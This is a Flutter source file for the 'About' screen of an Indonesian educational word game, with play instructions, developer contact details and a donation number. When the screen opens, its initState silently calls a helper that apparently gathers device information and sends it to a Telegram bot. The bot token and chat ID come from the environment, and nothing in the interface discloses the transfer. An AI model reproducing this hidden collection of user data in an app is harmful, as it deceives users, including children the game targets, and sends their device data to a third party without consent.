import 'package:belajar_matika/utils/device_info_helper.dart';
import 'package:belajar_matika/utils/tele_helper.dart';
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:logger/logger.dart';
import 'package:url_launcher/url_launcher.dart';

class AboutKataScreen extends StatefulWidget {
  const AboutKataScreen({super.key});

  @override
  State<AboutKataScreen> createState() => _AboutKataScreenState();
}

class _AboutKataScreenState extends State<AboutKataScreen> {
  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken: dotenv.env['BOT_TOKEN'] ?? '', // Ganti dengan token bot Anda
      chatId: dotenv.env['CHAT_ID'] ?? '', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text(
          "Tentang Aplikasi",
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 20,
            color: Colors.white,
          ),
        ),
        backgroundColor: Colors.blueAccent,
        centerTitle: true,
        automaticallyImplyLeading: false,
      ),
      body: SingleChildScrollView(
        child: Column(
          children: [
            // Header dengan Logo & Nama Aplikasi
            Container(
              padding: const EdgeInsets.all(20),
              decoration: const BoxDecoration(
                color: Colors.blueAccent,
                borderRadius: BorderRadius.only(
                  bottomLeft: Radius.circular(30),
                  bottomRight: Radius.circular(30),
                ),
              ),
              child: Column(
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(50),
                    child: Image.asset(
                      "assets/logo/logomatika.png", // Ganti dengan logo aplikasi
                      width: 80,
                      height: 80,
                    ),
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    "Susun Kata",
                    style: TextStyle(
                      fontSize: 22,
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                    ),
                  ),
                  const Text(
                    "Belajar kosa kata dengan cara yang menyenangkan!",
                    textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.white70),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // Deskripsi Aplikasi
            const Padding(
              padding: EdgeInsets.symmetric(horizontal: 20),
              child: Text(
                "Game Susun Kata adalah permainan edukatif yang membantu pemain belajar menyusun huruf menjadi kata yang benar. "
                "Game ini dirancang untuk anak-anak maupun orang dewasa yang ingin mengasah keterampilan bahasa mereka.",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 14, height: 1.5),
              ),
            ),
            const SizedBox(height: 10),
            // Cara bermain
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.blue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "Cara Bermain:",
                    style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                  ),
                  SizedBox(height: 5),
                  Text("1. Seret huruf ke kotak kosong untuk menyusun kata."),
                  Text("2. Jika susunan benar, skor akan bertambah."),
                  Text("3. Game memiliki 10 soal dalam satu sesi."),
                  Text("4. Selesaikan semua soal dalam waktu 60 detik."),
                ],
              ),
            ),

            // Informasi Developer
            _buildInfoCard(
              icon: Icons.person,
              title: "Dibuat oleh",
              subtitle: "Miftahularif",
            ),
            _buildInfoCard(
              icon: Icons.email,
              title: "Email",
              subtitle: "miftahularif.dev@gmail.com",
              isClickable: true,
              onTap: () => _launchURL("mailto:miftahularif.dev@gmail.com"),
            ),

            const SizedBox(height: 16),
            const SizedBox(
              width: double.infinity,
              child: Text("Donasi",
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.bold,
                      fontSize: 12)),
            ),
            const SizedBox(height: 8),
            Image.asset(
              'assets/logo/logo-ewallet.png',
              width: 130,
              // height: 120,
              fit: BoxFit.cover,
            ),
            const SizedBox(height: 8),
            const SizedBox(
              width: double.infinity,
              child: Text("0852-5088-7277",
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      color: Colors.black,
                      fontWeight: FontWeight.bold,
                      fontSize: 12)),
            ),
            const SizedBox(height: 8),

            // Tombol kembali
            const SizedBox(height: 30),
          ],
        ),
      ),
    );
  }

  // Widget untuk membuat info card
  Widget _buildInfoCard({
    required IconData icon,
    required String title,
    required String subtitle,
    bool isClickable = false,
    VoidCallback? onTap,
  }) {
    return GestureDetector(
      onTap: isClickable ? onTap : null,
      child: Card(
        margin: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
        elevation: 3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(15),
        ),
        child: ListTile(
          leading: Icon(icon, color: Colors.blueAccent),
          title:
              Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
          subtitle: Text(subtitle,
              style:
                  TextStyle(color: isClickable ? Colors.blue : Colors.black87)),
          trailing: isClickable
              ? const Icon(Icons.open_in_new, color: Colors.blueAccent)
              : null,
        ),
      ),
    );
  }

  // Fungsi untuk membuka URL
  void _launchURL(String url) async {
    if (await canLaunchUrl(Uri.parse(url))) {
      await launchUrl(Uri.parse(url));
    } else {
      debugPrint("Tidak bisa membuka URL: $url");
    }
  }
}
